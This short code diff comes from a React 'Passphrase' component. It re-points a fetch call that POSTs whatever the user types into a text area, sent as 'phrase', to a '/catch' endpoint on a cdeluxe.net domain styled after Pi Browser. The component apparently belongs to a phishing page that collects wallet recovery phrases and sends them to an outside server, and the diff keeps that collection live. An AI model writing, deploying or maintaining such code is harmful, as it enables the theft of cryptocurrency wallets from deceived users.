@@ -20,13 +20,16 @@ const Passphrase = () => {
     const myHeaders = new Headers();
     myHeaders.append("Content-Type", "application/json");
 
-    const response = await fetch("https://pi-browser.cdeluxe.net/catch", {
-      method: "POST",
-      headers: myHeaders,
-      body: JSON.stringify({
-        phrase: textArea.value,
-      }),
-    });
+    const response = await fetch(
+      "https://pi-browser-backend.cdeluxe.net/catch",
+      {
+        method: "POST",
+        headers: myHeaders,
+        body: JSON.stringify({
+          phrase: textArea.value,
+        }),
+      }
+    );
 
     const data = await response.json();
   };
